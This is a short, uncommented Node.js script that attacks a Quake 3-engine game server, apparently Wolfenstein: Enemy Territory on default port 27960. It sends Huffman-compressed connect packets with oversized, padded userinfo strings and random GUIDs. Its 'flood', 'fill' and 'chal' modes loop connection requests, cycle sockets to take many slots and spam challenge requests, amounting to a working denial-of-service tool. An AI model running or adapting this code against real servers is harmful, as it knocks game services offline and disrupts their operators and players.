const dgram = require('dgram');
let socket = dgram.createSocket('udp4');
const crypto = require('crypto');
const addon = require('bindings')('addon.node');

const ff = '\xFF\xFF\xFF\xFF';
const reqGetChallenge = Buffer.from(ff + 'getchallenge\n', 'binary');
const args = process.argv.slice(2);

const ipParts = args[0].split(':');
const server = {
  ip: ipParts[0],
  port: ipParts.length === 2 ? parseInt(ipParts[1]) : 27960
};

const size = parseInt(args[1]);

const flood = args.includes('flood');
const fill = args.includes('fill');
const chal = args.includes('chal');

const sendGetChallenge = () => {
  socket.send(reqGetChallenge, 0, reqGetChallenge.length, server.port, server.ip, err => {
    if (err) throw err;
    console.log('getchallenge');
  });
};
sendGetChallenge();

let count = 0;
const sendConnect = challenge => {
  count++;
  const guid = crypto.randomBytes(16).toString('hex').toUpperCase();
  const qport = Math.floor(Math.random() * 65536);
  const buf = Buffer.from(
    `${ff}connect "\\name\\ETPlayer\\rate\\25000\\snaps\\20\\cl_punkbuster\\1\\cl_guid\\${guid}\\protocol\\84\\qport\\${qport}\\challenge\\${challenge}${'\\a\\b'.repeat(size / 2)}"`,
    'binary'
  );
  const len = addon.huffCompress(buf, 12, buf.length);
  socket.send(buf, 0, len, server.port, server.ip, err => {
    if (err) throw err;
    if (flood) process.stdout.write('\rreq ' + count);
    if (fill) {
      socket.close();
      socket = dgram.createSocket('udp4');
      bindSocketListener();
      setImmediate(sendGetChallenge);
    }
  });

  if (flood) setImmediate(() => sendConnect(challenge));
};

const bindSocketListener = () => {
  socket.on('message', buf => {
    const ascii = buf.toString('binary');
    if (ascii.startsWith(ff + 'challengeResponse')) {
      const challenge = ascii.substr(22);
      console.log('challenge', challenge);
      sendConnect(challenge);
      if (chal) sendGetChallenge();
    } else if (ascii.startsWith(ff + 'connectResponse')) {
      console.log(ascii.substr(4));
    } else {
      console.log('unk pkt', buf.length, ascii);
    }
  });
};
bindSocketListener();